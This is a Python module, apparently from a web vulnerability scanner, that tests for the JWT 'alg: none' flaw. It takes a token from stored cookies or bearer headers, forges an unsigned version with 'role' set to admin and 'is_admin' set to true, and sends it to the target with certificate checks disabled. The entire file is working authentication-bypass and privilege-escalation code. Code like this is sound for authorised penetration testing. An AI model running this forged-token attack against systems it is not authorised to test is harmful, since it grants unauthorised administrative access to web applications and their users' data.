import requests
import base64
import json
from scanners.utils import GLOBAL_COOKIE, GLOBAL_BEARER

def run_jwt_fuzzer(url):
    """
    Detects JWT tokens in cookies/headers and attempts to bypass 
    authentication using the 'alg: none' vulnerability.
    """
    findings = []
    token = GLOBAL_BEARER
    if not token and GLOBAL_COOKIE and "eyJ" in GLOBAL_COOKIE:
        for cookie in GLOBAL_COOKIE.split(";"):
            if "eyJ" in cookie:
                token = cookie.split("=")[1].strip()
                break
                
    if not token or not token.startswith("eyJ"):
        return findings
        
    parts = token.split(".")
    if len(parts) != 3: return findings
    
    header = {"typ": "JWT", "alg": "none"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    
    try:
        payload_padded = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
        payload_data = json.loads(base64.urlsafe_b64decode(payload_padded).decode())
        if "role" in payload_data: payload_data["role"] = "admin"
        if "is_admin" in payload_data: payload_data["is_admin"] = True
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
    except Exception:
        payload_b64 = parts[1]
        
    evil_token = f"{header_b64}.{payload_b64}."
    
    headers = {"Authorization": f"Bearer {evil_token}"}
    if GLOBAL_COOKIE: headers["Cookie"] = GLOBAL_COOKIE.replace(token, evil_token)
    
    try:
        r = requests.get(url, headers=headers, timeout=5, verify=False)
        if r.status_code in [200, 201] and "application/json" in r.headers.get("Content-Type", ""):
            findings.append({
                "type": "JWT_ALG_NONE_BYPASS",
                "url": url,
                "severity": "CRITICAL",
                "confidence": "HIGH",
                "verified": True,
                "detail": "JWT 'alg: none' vulnerability detected! Server accepted an unsigned JWT token with an elevated payload."
            })
    except Exception: pass
    return findings
